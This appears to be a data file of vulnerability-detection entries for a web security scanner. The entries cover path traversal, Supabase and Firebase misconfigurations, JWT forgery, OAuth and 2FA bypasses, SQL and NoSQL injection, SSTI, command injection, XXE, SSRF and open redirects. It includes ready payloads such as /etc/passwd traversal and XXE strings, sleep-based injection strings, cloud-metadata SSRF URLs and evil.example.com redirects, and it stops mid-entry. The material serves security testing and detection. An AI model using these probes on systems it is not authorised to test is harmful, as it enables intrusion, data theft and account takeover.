description: Gin's router.Static and echo's e.Static, as well as http.FileServer, can be configured to serve a directory. Insufficient path sanitization or misconfigured root paths can allow traversal sequences (../) to escape the intended directory and read arbitrary files on the server, including Go source, config files, or .env files.
runtime_discovery: Fuzz static-serving routes with URL-encoded and double-encoded path traversal sequences: /static/../../etc/passwd, /static/%2e%2e%2f%2e%2e%2fetc%2fpasswd. Observe response content-type and body.
detection_signal: HTTP 200 response with body containing Unix passwd-file content ('root:x:0:0'), Go source file content ('package main'), or .env file markers ('DB_PASSWORD=', 'SECRET_KEY=') when traversal sequences are submitted.

name: Missing CSRF Protection on State-Changing Endpoints
description: Go web applications that use cookie-based sessions and do not apply CSRF middleware (gorilla/csrf, echo CSRF middleware) on POST/PUT/DELETE endpoints are vulnerable to cross-site request forgery. The default mux and gin/echo have no built-in CSRF protection.
runtime_discovery: Identify state-changing endpoints using session cookies. Submit cross-origin POST requests (via a crafted HTML form or fetch with no CSRF token) and observe whether the server processes the request successfully.
detection_signal: HTTP 200 or 204 response to a state-changing POST/PUT/DELETE request submitted without a CSRF token header or body parameter, when a valid session cookie is present. Confirmed when the same request without the session cookie returns 401/403.

name: Unrestricted HTTP Methods on Go Endpoints
description: net/http's default ServeMux routes match any HTTP method. A handler registered with http.HandleFunc('/api/data', ...) responds to GET, POST, PUT, DELETE, TRACE, and OPTIONS equally unless the handler explicitly checks r.Method. TRACE responses can expose cookies and headers; unexpected method acceptance may bypass authorization logic.
runtime_discovery: Issue TRACE, OPTIONS, and arbitrary HTTP method (FUZZ, HACK) requests to all discovered endpoints. Observe which methods return non-405 responses. Check TRACE responses for cookie/header reflection.
detection_signal: TRACE request returns HTTP 200 with request headers reflected in the response body (including Cookie and Authorization headers). Or OPTIONS response lists methods including TRACE/CONNECT/arbitrary verbs not expected for the endpoint.

name: No Rate Limiting on Authentication and Sensitive Endpoints
description: Go frameworks provide no built-in rate limiting. Applications that omit golang.org/x/time/rate, a middleware package, or a reverse-proxy rule on login, password-reset, OTP verification, and account enumeration endpoints are vulnerable to brute-force and credential-stuffing attacks.
runtime_discovery: Send 50-100 rapid successive POST requests to /login, /forgot-password, or /verify-otp with varying credentials. Measure whether response time, status code, or body changes to indicate throttling or lockout.
detection_signal: All 100 requests return the same HTTP status code and response time distribution with no 429 Too Many Requests, no Retry-After header, and no CAPTCHA challenge; response body remains consistent (no lockout message) across all attempts.

name: Mass Assignment via Echo/Gin Struct Binding
description: Gin's c.ShouldBindJSON and echo's c.Bind bind the entire request body to a struct. If the struct includes sensitive fields (IsAdmin, Role, Balance, OwnerID) that the developer did not intend to be settable by the client, an attacker can include those fields in the request body to escalate privileges or tamper with data.
runtime_discovery: Submit POST/PUT requests with additional JSON fields beyond those expected by the API (is_admin:true, role:'admin', balance:9999999, owner_id:<other user>). Observe whether a subsequent GET of the resource reflects the injected values.
detection_signal: A subsequent GET request for the resource shows the injected field value persisted (e.g., role field changed to 'admin', balance field reflects the attacker-supplied number), or the application returns elevated-privilege responses after the injection.

name: Supabase Table Readable by Anon Key (RLS Disabled or No SELECT Policy)
description: A Supabase table has Row-Level Security disabled or no SELECT policy for the `anon` role, allowing anyone possessing the public anon key (which is always embedded in client bundles) to read every row via the PostgREST REST endpoint. This is the single most common Supabase misconfiguration found in bug bounty.
runtime_discovery: Extract the Supabase URL and anon key from the app's JavaScript bundle or network traffic. Issue GET /rest/v1/<table>?select=*&limit=10 with headers `apikey: <anon_key>` and `Authorization: Bearer <anon_key>`. A 200 response containing rows confirms the table is unprotected. Enumerate table names from JS bundle, network requests, or the PostgREST schema endpoint (GET /rest/v1/ returns the OpenAPI spec listing all tables).
detection_signal: HTTP 200 with a JSON array body from GET /rest/v1/<table>?select=*; row count > 0; column names visible in response body. The OpenAPI spec at /rest/v1/ enumerates all exposed table names.

name: Supabase Table Writable by Anon Key (No INSERT/UPDATE/DELETE Policy)
description: Even when SELECT is blocked, Supabase tables may lack INSERT, UPDATE, or DELETE policies for the `anon` role, allowing unauthenticated users to inject or mutate arbitrary rows. The `Prefer: tx=rollback` header causes PostgREST to roll back the transaction after confirming the write would succeed, making detection safe.
runtime_discovery: For each table discovered as accessible (or listed via the OpenAPI spec), send POST /rest/v1/<table> with a synthetic body and headers `Prefer: tx=rollback, return=minimal` and `Content-Type: application/json`. A 400 response (schema mismatch) instead of 403 proves INSERT access is enabled. For UPDATE, try PATCH /rest/v1/<table>?id=eq.999999 with a dummy column; 404 vs 403 distinguishes allowed-but-not-found from blocked.
detection_signal: POST to /rest/v1/<table> returns HTTP 400 (column constraint / schema error) rather than HTTP 403 (RLS blocked). HTTP 201 or 409 also confirms write access. The distinguishing signal is any non-403 status when an unauthorized write is attempted.

name: Supabase service_role Key Exposed in Client Bundle
description: The Supabase `service_role` JWT has the `role` claim set to `service_role`, which bypasses all Row-Level Security policies entirely and grants full database admin access. If this key is embedded in client JavaScript instead of kept server-side, any visitor extracts a god-mode database credential.
runtime_discovery: Intercept network traffic or inspect JavaScript bundles for long JWT strings (eyJ...). Base64-decode the JWT payload (second `.`-separated segment) and read the `role` claim. A value of `service_role` confirms the critical exposure. Also check `Authorization` headers in requests captured by a proxy.
detection_signal: JWT payload decoded from a string found in JS bundle or network request contains `"role": "service_role"`. The token is distinguishable from the anon key because the anon key contains `"role": "anon"`.

name: Supabase BOLA via Insufficient RLS Policy (Auth Filter Missing auth.uid())
description: An RLS policy exists but its USING clause does not correctly scope rows to the authenticated user (e.g., `USING (true)` or checking a non-user-specific column). Authenticated user A can read or modify user B's rows by simply querying the table, because the policy grants access to all authenticated users rather than only the row owner.
runtime_discovery: Authenticate as two different test users (user A and user B). Both users create a resource (e.g., a profile or order). User A queries GET /rest/v1/<table>?select=* with their JWT. If the response includes rows owned by user B (identified by a `user_id` or `owner_id` column differing from user A's `auth.uid()`), the RLS policy has an IDOR/BOLA flaw. Automate by comparing the `user_id` column in results against the authenticated JWT's `sub` claim.
detection_signal: Response to GET /rest/v1/<table>?select=* with user A's auth token includes rows where `user_id` != user A's JWT `sub` claim. Differential: user B's known resource ID appears in user A's result set.

name: Supabase RPC Function Callable by anon Without auth.uid() Check
description: Supabase RPC functions (PostgreSQL functions exposed via `/rest/v1/rpc/<fn>`) execute with the permissions of the defining role. If EXECUTE is granted to `anon` and the function body does not verify `auth.uid()`, unauthenticated callers can trigger mutations, admin operations, or cross-user data access that RLS would otherwise block.
runtime_discovery: Enumerate RPC function names from JS bundle network calls or the PostgREST OpenAPI spec at /rest/v1/. POST /rest/v1/rpc/<function_name> with empty body `{}` and the anon key. A non-403 response (200, 400 with schema error, 500 with internal error) indicates the function is reachable. Cross-reference with the function's JS invocation context to assess impact.
detection_signal: POST /rest/v1/rpc/<fn> with anon credentials returns HTTP 200, 400, or 500 instead of HTTP 403. Function names containing 'admin', 'delete', 'update', 'transfer', or 'bulk' are highest priority.

name: Supabase Storage Bucket Publicly Readable (No Storage Policy)
description: Supabase Storage buckets created with `public: true` or without `SELECT` storage policies allow any person to list and download all objects via the `/storage/v1/object/list/<bucket>` and `/storage/v1/object/public/<bucket>/<path>` endpoints without authentication. Common with user-uploaded files like profile photos, contracts, and receipts.
runtime_discovery: Issue GET /storage/v1/bucket with the anon key. The response lists all buckets and their `public` flag. For each bucket, issue GET /storage/v1/object/list/<bucket_name>?limit=10 with the anon key. A 200 response with an `items` array confirms object listing. For public buckets, directly fetch object URLs without any auth header.
detection_signal: GET /storage/v1/bucket returns a JSON array where any entry has `"public": true`. GET /storage/v1/object/list/<bucket> with anon key returns HTTP 200 with an `items` array. Public object URLs are directly accessible without Authorization header.

name: Supabase Realtime Channel Subscription Without Authorization (BOLA)
description: Supabase Realtime channels based on predictable patterns (e.g., `user-<uuid>`, `notifications-<userid>`) can be subscribed to by any authenticated — or even anonymous — client if channel-level authorization policies are not configured. An attacker can subscribe to another user's notification stream and receive real-time data meant only for that user.
runtime_discovery: Intercept WebSocket traffic during app use. Observe the `realtime:channel` subscription message format. Extract the channel naming pattern from JavaScript source. Using a second authenticated session (user B), subscribe to user A's channel name (e.g., `user-<user_A_uuid>`). If messages intended for user A arrive in user B's subscription, the channel is unprotected. The channel name may also appear in the PostgREST schema or JS bundle.
detection_signal: WebSocket subscription to a channel named with another user's identifier (extracted from profile API) succeeds (server sends `phx_reply` with `status: ok`) and delivers messages. JS bundle contains hardcoded channel patterns like `user-${userId}` or `private-${uid}`.

name: Firebase Realtime Database Open to Public Read (No Security Rules)
description: Firebase Realtime Database projects with no rules, test mode rules (`".read": true`), or the default open rules allow anyone to read or write the entire database tree without any authentication. Firebase emits a security alert for this but many projects remain misconfigured.
runtime_discovery: Extract the Firebase database URL from the app's JS bundle (matches `https://<project>.firebaseio.com`). Issue GET https://<project>.firebaseio.com/.json?shallow=true (no credentials needed). A 200 response with non-null JSON data confirms public read. To confirm write access, attempt PUT to a test path (e.g., /.json path with a canary key). Firebase returns 200 on success or 401/permission_denied when rules block.
detection_signal: GET https://<project>.firebaseio.com/.json?shallow=true returns HTTP 200 with JSON body containing top-level keys (not `null` or `{"error": "Permission denied"}`). Response time < 2s with data confirms live open database.

name: Firebase Storage Publicly Listable Bucket
description: Firebase Storage security rules that allow `allow read: if true` or missing storage rules permit any unauthenticated user to enumerate and download objects. The Firebase Storage REST API is accessible without authentication when rules permit.
runtime_discovery: Extract the Firebase storage bucket name from JS config (e.g., `<project>.appspot.com`). Issue GET https://firebasestorage.googleapis.com/v0/b/<bucket>/o?maxResults=5 without credentials. A 200 response with an `items` array confirms public listing. Attempt to download the first object's download URL. Check for sensitive filenames (receipts, invoices, private documents).
detection_signal: GET https://firebasestorage.googleapis.com/v0/b/<bucket>/o returns HTTP 200 with `{"items": [...]}` array without any Authorization header. Object download URLs in the `downloadTokens` field are accessible publicly.

name: PocketBase Collection Readable Without Auth (No API Rules Set)
description: PocketBase collections have per-operation API rules (list, view, create, update, delete). When a rule is left empty, PocketBase defaults to allowing ALL requests for that operation — including unauthenticated ones. A common mistake is creating a collection and never setting list/view rules, exposing all records publicly.
runtime_discovery: Probe GET /api/collections (returns collection names when admin API is accessible). For each collection name, issue GET /api/collections/<name>/records?perPage=5 without any auth token. A 200 response with a `items` array and `totalItems > 0` confirms the collection is open. Also attempt the /api/health endpoint to confirm the PocketBase instance is live.
detection_signal: GET /api/collections/<name>/records without Authorization header returns HTTP 200 with `{"items": [...], "totalItems": N}`. The `/api/collections` list endpoint returning 200 without admin credentials also indicates misconfigured admin API exposure.

name: GraphQL Introspection Enabled on Production Endpoint
description: GraphQL introspection allows any client to enumerate the complete schema — all types, queries, mutations, and field names — without authentication. On production APIs, this gives attackers a roadmap to hidden admin mutations, internal data types, and undocumented fields that can accelerate BOLA/IDOR discovery and input fuzzing.
runtime_discovery: Send POST to the GraphQL endpoint (typically /graphql, /api/graphql, /v1/graphql, /hasura/v1/graphql) with body `{"query": "{__schema{queryType{name}}}"}` and `Content-Type: application/json`. A 200 response containing `__schema` data confirms introspection is enabled. Follow up with a full introspection query to map all types and resolve mutation names.
detection_signal: HTTP 200 response to POST /graphql with `{"query":"{__schema{queryType{name}}}"}` body contains `{"data":{"__schema":{...}}}`. Non-null `queryType` field confirms introspection is live. Hasura specifically returns a large schema JSON including `x-hasura-*` permission directives.

name: GraphQL BOLA — Direct Object Reference via ID Parameter
description: GraphQL resolvers that accept an `id` argument and return a resource without verifying the requester owns it are susceptible to Broken Object Level Authorization. An attacker authenticated as user A can query resources owned by user B by incrementing or guessing integer IDs or UUIDs. This is especially common in Hasura when table permissions are misconfigured.
runtime_discovery: Authenticate as user A and note the IDs of your own resources (e.g., order ID, message ID) returned in normal queries. Then query the same type by ID substituting known or guessed IDs of other users: `query { order(id: <other_id>) { id, user_id, amount, details } }`. If the response returns another user's data, BOLA is confirmed. In Hasura, compare query results with and without the `x-hasura-user-id` session variable.
detection_signal: GraphQL query response for resource with ID not belonging to authenticated user returns `{"data": {"resource": {...}}}` with non-null fields and a `user_id` or `owner` field differing from the authenticated user's ID. Auth-differential (user A querying user B's ID) shows data in one session but not the other when access control is correct — if both return data, BOLA is present.

name: GraphQL Query Batching / Alias Amplification (DoS / Brute-Force)
description: GraphQL supports sending an array of operations in a single HTTP request (batching) and allows field aliasing to repeat the same resolver many times in one query. Without rate-limiting on query depth, breadth, or alias count, attackers can send a single POST containing hundreds of login attempts or expensive queries, bypassing per-request rate limits and enabling credential stuffing or DoS.
runtime_discovery: Send a POST to the GraphQL endpoint with a JSON array body containing 100 identical login mutations: `[{"query": "mutation { login(email: \"x\", password: \"y\") { token } }"}, ...]`. Alternatively, send one query with 100 aliased calls: `query { a1: user(id:1){id} a2: user(id:2){id} ... }`. If the server executes all operations and returns a 200 with an array of results, batching is enabled without restriction.
detection_signal: POST to /graphql with a JSON array of N operations returns HTTP 200 with a JSON array of N result objects. Single query with N field aliases returns N resolver results in one response. Per-request rate-limit is not triggered. Response time scales linearly with N (confirms all operations executed).

name: Hasura Admin Secret Exposed in Client Bundle or Headers
description: Hasura's admin secret, when present in the `x-hasura-admin-secret` header, bypasses all permission rules and grants full database access. This secret is sometimes accidentally hardcoded in JavaScript bundles, environment variable leaks, or CI/CD configuration. Even its presence as a string in JS is critical because it provides complete Hasura admin access.
runtime_discovery: Intercept all HTTP requests from the running app and inspect headers for `x-hasura-admin-secret`. Search JavaScript bundle content for strings matching Hasura admin secret patterns. Send a test GraphQL query with the discovered secret as the `x-hasura-admin-secret` header: if the response returns data that would normally require authentication, the secret is confirmed valid.
detection_signal: HTTP request header `x-hasura-admin-secret` present in client-originating requests captured by proxy. String in JS bundle matching Hasura admin secret format. GraphQL query with the candidate secret returns HTTP 200 with `{"data": {...}}` instead of 401/403.

name: Appwrite Collection With Guest Read/Write Permission
description: Appwrite collections and documents support granular permissions per role, including `role:all` (public) and `role:guests` (unauthenticated). When a collection is created with these roles having read or write access, any unauthenticated HTTP request can enumerate or mutate all documents, regardless of whether the app's frontend enforces authentication.
runtime_discovery: Extract the Appwrite endpoint and project ID from the JS bundle (typical pattern: `https://<host>/v1`, `X-Appwrite-Project: <projectId>`). Issue GET /v1/databases with the project header only (no session token). A 200 response listing databases exposes configuration. For each database/collection ID found, issue GET /v1/databases/<dbId>/collections/<colId>/documents without auth and observe the response.
detection_signal: GET /v1/databases/<dbId>/collections/<colId>/documents without `X-Appwrite-Session` or `X-Appwrite-Key` returns HTTP 200 with `{"total": N, "documents": [...]}`. Document entries contain `$permissions` arrays showing `role:all` or `role:guests` on read operations.

name: IDOR / BOLA via Numeric Object ID
description: An authenticated user can access or modify another user's object by substituting a predictable numeric or UUID identifier in the URL, request body, or query parameter. The server performs no ownership check against the session.
runtime_discovery: Crawl authenticated as User A, collect all URLs/API calls containing an ID parameter. Re-issue each request incrementing or decrementing the ID value by 1, and also replay using User B's object IDs observed during a parallel User B session. Compare response body size, status code, and presence of PII fields.
detection_signal: HTTP 200 with non-empty response body (matching schema of the original object) when the substitute ID belongs to a different user; or successful 200/204 on a PUT/DELETE that was only initiated with User A's session against User B's resource ID.

name: BOLA via Non-Sequential (UUID) Object Reference
description: APIs that use UUIDs instead of sequential integers are still vulnerable to BOLA when the UUID is disclosed in one endpoint (e.g., an admin list or email link) and can be replayed by a lower-privileged session. Developers often skip authorization checks assuming UUIDs are unguessable.
runtime_discovery: Authenticate as a high-privilege user (admin), enumerate object UUIDs from listing endpoints. Then switch to a low-privilege session and replay GET/PUT/DELETE requests using those UUIDs. Also check Referer, Location, and Link headers, JavaScript source bundles loaded by the browser, and email notification URLs for leaked UUIDs.
detection_signal: Low-privilege session receives HTTP 200 with full object payload (matching admin-visible schema), or 204 on a mutating request, when using a UUID harvested from an admin session.

name: Broken Function-Level Authorization (BFLA) — Admin Endpoint Reachable by Regular User
description: Administrative or privileged functions (user deletion, role assignment, bulk export, config change) are accessible via undocumented or obscured endpoints that the UI hides but the server does not gate. A regular authenticated session can call them directly.
runtime_discovery: Crawl the app as an admin to collect the full URL inventory. Replay each admin-only API call (especially POST/PUT/DELETE to paths containing /admin/, /internal/, /manage/, /v*/admin) using a session authenticated as a regular user. Check for HTTP verb variations: if the UI uses GET, try POST/PUT/DELETE to the same path.
detection_signal: Regular-user session receives 200/201/204 (not 401/403) on a request to a function that returned 200 for the admin session; response body or side-effect (e.g., resource deleted, role changed) confirms execution.

name: JWT Algorithm Confusion — 'none' Algorithm Accepted
description: Some JWT libraries accept tokens with `alg: none` or `alg: NONE`, treating them as valid without verifying the signature. An attacker can forge arbitrary claims (e.g., elevated role, different user ID) by crafting an unsigned token.
runtime_discovery: Capture a valid JWT from the Authorization header or cookie. Decode the header and payload, modify the payload (e.g., set `role: admin` or change `sub` to another user's ID), set the header to `{"alg":"none","typ":"JWT"}`, and reconstruct the token with an empty signature segment. Replay the modified token against protected endpoints.
detection_signal: Server returns 200 with privileged content (or acts on the forged claim) instead of 401/403/signature-error when presented a token with `alg: none` and a tampered payload.

name: JWT Algorithm Confusion — RS256 Public Key Used as HS256 Secret
description: When a server uses RS256, the public key may be published at a JWKS endpoint. If the library accepts HS256, an attacker can sign a forged token with HS256 using the server's public key as the HMAC secret, bypassing signature verification.
runtime_discovery: Fetch the server's JWKS endpoint (/.well-known/jwks.json or observed in JS source). Extract the public key (PEM). Craft a JWT with `alg: HS256` signed using that public key as the HMAC-SHA256 secret, modifying claims as desired. Present the forged token to authenticated endpoints.
detection_signal: Protected endpoint returns 200 with valid user data (or elevated-privilege response) when presented an HS256-signed token that was forged using the server's RSA public key.

name: JWT Weak HMAC Secret (Brute-Forceable)
description: HS256/HS384/HS512 tokens signed with short, common, or default secrets (e.g., 'secret', 'password', app name) can be cracked offline in seconds, allowing an attacker to forge arbitrary tokens.
runtime_discovery: Capture a JWT from any authenticated response (Authorization header, Set-Cookie, or JSON body). Run the token through a wordlist attack (hashcat mode 16500 or jwt_tool). If the secret is recovered, forge a token with a modified sub/role claim and replay it.
detection_signal: hashcat or jwt_tool recovers the signing secret from the captured token within a wordlist run; subsequently, a forged token is accepted by the server (HTTP 200 on a protected endpoint).

name: OAuth Authorization Code Leaked via Open Redirect
description: If the OAuth authorization server allows redirect_uri values that can be manipulated (loose prefix matching, missing exact match), or if the client app has an open redirect, the authorization code can be sent to an attacker-controlled URI.
runtime_discovery: Initiate an OAuth flow and intercept the authorization request. Modify redirect_uri to a variant of the registered URI (subdomain swap, path traversal, appended path, URL-encoded characters). Observe whether the authorization server redirects the code to the modified URI instead of rejecting with an invalid_redirect_uri error.
detection_signal: Authorization server issues a redirect to the attacker-controlled redirect_uri (HTTP 302 Location header contains the manipulated URI with `code=` parameter present), rather than returning an error response.

name: OAuth CSRF — Missing or Unvalidated State Parameter
description: OAuth flows that omit the `state` parameter or accept any value without binding it to the user's session are vulnerable to CSRF. An attacker can trick a victim into completing an OAuth flow that links the attacker's external account to the victim's app account.
runtime_discovery: Initiate an OAuth flow, capture the authorization URL, and inspect it for the `state` parameter. If absent, attempt a CSRF attack by forwarding a crafted callback URL with a known `code` to the victim. If state is present, replay the callback omitting state or with a substituted static value and observe whether the server accepts it.
detection_signal: Callback endpoint processes the authorization code (HTTP 200/302 redirect to authenticated area) when state parameter is absent or does not match the session-bound nonce, indicating no CSRF validation.

name: Session Fixation
description: The application fails to issue a new session token upon successful authentication, allowing an attacker who pre-plants a known session ID (via URL parameter, cookie injection, or a pre-auth session) to hijack the authenticated session.
runtime_discovery: Obtain a pre-authentication session token (visit the login page without authenticating). Record the session ID. Complete the login flow. Inspect the post-login Set-Cookie header: if the session ID is identical to the pre-auth value, the app is vulnerable. Additionally, test whether the app accepts a session ID supplied in a URL parameter and promotes it to a cookie.
detection_signal: The session cookie value in the post-login Set-Cookie response is identical to the session cookie value present before authentication (diff of pre-auth vs post-auth session token shows no change).

name: Predictable or Short-Lived Password Reset Token Brute-Force
description: Password reset tokens derived from timestamps, MD5(email), or low-entropy RNG can be guessed or brute-forced. Tokens that are long-lived further extend the attack window.
runtime_discovery: Trigger password resets for a controlled email address multiple times in quick succession. Examine the reset tokens received: check length, character set, and whether tokens share a common prefix or are sequential. Attempt to decode as Base64/hex and look for recognizable fields (timestamp, username hash). Test if an expired token is still accepted after use.
detection_signal: Reset tokens are fewer than 128 bits of entropy; or tokens show sequential/predictable patterns across multiple requests; or a previously used/expired token still returns 200 on the reset confirmation endpoint instead of an error.

name: Password Reset Poisoning via Host Header Injection
description: The password reset email contains a link whose domain is built from the HTTP Host (or X-Forwarded-Host) header rather than a configured base URL. An attacker who sends the reset request with a spoofed Host header receives the victim's reset token at their own domain.
runtime_discovery: Trigger a password reset for a target account. Intercept the request and inject a modified Host header (or add X-Forwarded-Host) pointing to a controlled domain. Observe whether the resulting reset email contains a link to that injected domain, or use the Burp Collaborator / out-of-band DNS callback to detect the token being fetched.
detection_signal: Out-of-band DNS/HTTP callback to the injected host receives a GET request with the victim's reset token as a query parameter; or the reset email (checked via test account) contains a link with the injected domain instead of the app's canonical domain.

name: OTP / 2FA Code Returned in API Response
description: The server sends the one-time password or SMS verification code directly in the HTTP response body (e.g., in a JSON field like `otp`, `code`, or `debug_token`), making 2FA trivially bypassable without access to the user's phone.
runtime_discovery: Trigger an OTP send action (login with valid credentials, registration, phone verification). Inspect the raw HTTP response body and headers for numeric strings matching the OTP length (4-8 digits), or JSON keys named `otp`, `code`, `token`, `pin`, `verification_code`, `debug`. Also check Location headers and cookies set at this step.
detection_signal: HTTP response body or header contains a field whose value matches the exact OTP that completes the 2FA challenge (confirmed by using the extracted value to pass the 2FA step without receiving an SMS).

name: 2FA Bypass by Directly Accessing Post-Auth Endpoint
description: After supplying valid credentials but before completing the 2FA step, the server may issue a partially-authenticated session token. If post-authentication endpoints do not verify that the 2FA step was completed, the attacker can skip the 2FA page and directly navigate to protected pages.
runtime_discovery: Complete step 1 of login (credentials accepted, 2FA prompt shown). Capture the session cookie issued at this point. Without completing 2FA, replay requests to authenticated-only endpoints (dashboard, profile, API) using that partial session. Observe whether the server grants full access or enforces 2FA completion.
detection_signal: Requests to authenticated-only endpoints using the partial (pre-2FA) session token return HTTP 200 with full user data instead of redirecting to the 2FA prompt or returning 401/403.

name: 2FA OTP Brute-Force — No Rate Limiting or Lockout
description: The OTP verification endpoint accepts unlimited guesses without rate limiting, account lockout, or CAPTCHA, allowing an attacker to brute-force a 4–6 digit numeric OTP in seconds to minutes.
runtime_discovery: After reaching the 2FA OTP entry screen with a valid partial session, send automated POST requests to the OTP submission endpoint cycling through all possible values (0000–9999 for 4-digit, or a subset for 6-digit). Measure whether the server returns 429 Too Many Requests, locks the session, or continues returning 401/400 without restriction.
detection_signal: Server returns consistent 401/400 (wrong OTP) responses across 100+ sequential attempts without a 429, redirect to lockout page, or increasing delay; confirms absence of rate limiting.

name: OIDC Account Takeover via Unverified email_verified Claim
description: Applications that match OIDC identities to local accounts using only the `email` claim without checking `email_verified: true` can be exploited by attackers who register an unverified IdP account with a victim's email address, obtaining a valid ID token that grants access to the victim's app account.
runtime_discovery: Register an account at the OAuth/OIDC Identity Provider using the target email without verifying it (some providers allow this). Complete the OIDC flow with the app. Inspect the ID token JWT claims for `email_verified` field. Observe whether the app accepts the login and maps to the victim's existing account.
detection_signal: App completes login and opens the victim's account session when presented with an OIDC ID token containing `email_verified: false` (or missing the field) for an email address that corresponds to an existing app account.

name: Error-Based SQL Injection
description: SQL metacharacters injected into form fields, URL parameters, cookies, or JSON bodies cause the database to surface error messages containing driver/version strings, table names, or stack traces in the HTTP response. The most common class of SQLi found in bug bounties due to its unambiguous signal.
runtime_discovery: Fuzz every user-supplied input (GET/POST params, path segments, JSON keys, cookie values, HTTP headers that land in queries) with single-quote, double-quote, comment sequences (--,--, #), and stacked-query delimiters. Compare HTTP response body, status code, and content-length against the benign baseline.
detection_signal: Response body contains DB-engine error strings: 'you have an error in your SQL syntax', 'ORA-00907', 'pg_query()', 'Unclosed quotation mark', 'SQLSTATE[42000]', 'Microsoft OLE DB Provider for SQL Server', or an HTTP 500 with a stack trace that names a DB library. Response content-length diverges meaningfully from the baseline.

name: Boolean-Blind SQL Injection
description: The application silently alters the result set or page content based on a true/false SQL condition injected into a parameter, without producing visible errors. The canonical form appends ' AND 1=1-- (true) vs ' AND 1=2-- (false) and diffs the responses.
runtime_discovery: For each fuzzable parameter, send three requests: benign, always-true condition appended (' AND '1'='1), always-false condition appended (' AND '1'='2). Compare body content, content-length, element counts, and DOM structure across the three responses.
detection_signal: True-condition response is semantically identical to the benign baseline (same records rendered, same content-length ± a few bytes), while the false-condition response differs structurally (empty result set, 'no results found', zero-length list, missing DOM section). Consistent bifurcation across multiple parameter values confirms injection.

name: Time-Based Blind SQL Injection
description: The injected payload causes the database to sleep or perform a heavy operation, producing a measurable response-time delay. Works even when the app returns identical responses for true and false cases (e.g., always renders the same error page).
runtime_discovery: Inject time-delay payloads into each parameter: MySQL: ' AND SLEEP(5)--, MSSQL: '; WAITFOR DELAY '0:0:5'--, PostgreSQL: '; SELECT pg_sleep(5)--. Record baseline RTT for each endpoint, then measure delta. Run at least 3 rounds per payload to filter network jitter.
detection_signal: Response latency for the injected request exceeds baseline by ≥4 seconds in a statistically consistent manner (all 3 rounds delayed). Latency scales linearly with the sleep argument (1s, 3s, 5s). No change in response body or status code between injected and benign requests.

name: NoSQL Operator Injection (MongoDB / DocumentDB)
description: MongoDB query operators ($gt, $ne, $where, $regex) injected via JSON body or query-string parameter notation bypass authentication or extract data without knowing credentials. Common in Node.js APIs that pass req.body directly into db.collection.find().
runtime_discovery: For login forms and search endpoints accepting JSON, replace string field values with operator objects: {'username': {'$ne': ''}, 'password': {'$ne': ''}}. Also try query-string form: ?username[$ne]=&password[$ne]=. Observe whether the app logs in, returns a 200 with user data, or behaves differently than when correct credentials are supplied.
detection_signal: HTTP 200 with a valid session cookie or auth token returned for the $ne payload when no valid credentials were sent. Alternatively, a search endpoint returns all documents instead of zero results when the $ne or $gt operator is injected into a filter field. Response body size is significantly larger than expected for a 'not found' case.

name: Server-Side Template Injection (SSTI)
description: User-supplied input is embedded directly into a server-side template string and evaluated by the template engine. A math expression like {{7*7}} that returns 49 in the response confirms arbitrary expression evaluation, which typically escalates to RCE via engine-specific sandbox escapes.
runtime_discovery: Inject polyglot probe strings into all user-visible text fields (search boxes, profile fields, feedback forms, email templates, report names): {{7*7}}, ${7*7}, #{7*7}, <#assign x=7*7>${x}, *{7*7}. Submit and inspect the rendered HTML response for the evaluated result (49). Use a secondary canary string to distinguish reflection from coincidence.
detection_signal: The literal string '49' (or engine-specific evaluated output) appears in the response body in place of the probe expression. The expression is not echo-reflected verbatim — it has been evaluated. Confirmed by varying the multiplier (e.g., {{7*8}} yields 56) to rule out static content matches.

name: OS Command Injection
description: User input passed to a shell command without proper sanitization allows injection of additional OS commands via metacharacters (;, |, &&, $(), backticks). Common in features like ping/traceroute utilities, file conversion, image processing, DNS lookup, or report generation backed by shell calls.
runtime_discovery: Inject shell metacharacters with time-delay payloads into parameters likely passed to OS commands (filename, host, ip, domain, format fields): ; sleep 5, | sleep 5, && sleep 5, $(sleep 5), `sleep 5`. Measure response latency delta vs baseline. For OOB confirmation, inject DNS callback payloads (ping -c1 <collaborator_host>) and monitor the listener.
detection_signal: Time-delay: response latency consistently exceeds baseline by ≥4 seconds for sleep-based payloads. OOB: DNS or HTTP request received at the Burp Collaborator / interactsh listener with the app's source IP. Error-based: response contains shell output fragments like uid=, /etc/passwd lines, or Windows system directory listings when whoami/dir is injected.

name: XML External Entity (XXE) Injection
description: An XML parser configured to process external entity declarations allows attackers to read local files, perform SSRF, or trigger denial of service by embedding DOCTYPE declarations with SYSTEM or PUBLIC entity references in XML payloads.
runtime_discovery: Identify endpoints that consume XML (file uploads, SOAP, XML API bodies, SVG uploads, DOCX/XLSX imports). Replace or inject a DOCTYPE block into the XML: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]> and reference &xxe; in the body. Submit and inspect response. For blind XXE, use an out-of-band SYSTEM entity pointing to a Burp Collaborator HTTP URL.
detection_signal: In-band: response body contains the contents of /etc/passwd (root:x:0:0:), /etc/hostname, or Windows system files. OOB: HTTP or DNS interaction received at the collaborator listener with the request originating from the app server's IP. Error-based: XML parser error message reveals local file path or network connectivity to internal hosts.

name: Server-Side Request Forgery (SSRF)
description: The application fetches a remote resource using a user-supplied URL without restricting the target. An attacker can redirect the server to internal metadata endpoints (169.254.169.254, fd00:ec2::254), internal services, or arbitrary external hosts, leaking credentials, tokens, or enabling lateral movement.
runtime_discovery: Identify parameters that accept URLs or hostnames (webhook, avatar_url, callback, feed, import, preview, pdf_url, fetch). Substitute values with: (1) Burp Collaborator/interactsh URL to confirm OOB fetch, (2) http://169.254.169.254/latest/meta-data/ for cloud metadata, (3) http://localhost:6379/ for internal Redis, (4) http://[::1]:8080/admin for IPv6 loopback bypass.
detection_signal: OOB: HTTP request received at collaborator listener from the app server IP. In-band: response body or error message contains cloud metadata content (ami-id, instance-type, IAM role credentials), internal service banners (Redis -ERR, SSH-2.0-), or internal IP addresses. Timing difference when requesting closed vs open internal ports (TCP connect timing oracle).

name: Open Redirect
description: User-supplied URL values in redirect parameters (next, return, redirect_uri, continue, goto, url) are followed by the server without validation, enabling phishing and OAuth token theft via redirect_uri hijacking. A subset of cases involves JavaScript-URI redirects that execute script in the browser.
runtime_discovery: Enumerate all redirect-like parameters in login flows, logout handlers, OAuth callbacks, and navigation links. Replace the value with an external URL (https://evil.example.com) and an OOB collaborator URL. Follow the redirect chain with a headless browser or intercept at the proxy level. Also try protocol-relative (//evil.example.com) and bypass encodings (%2F%2F, ///evil.example.com).
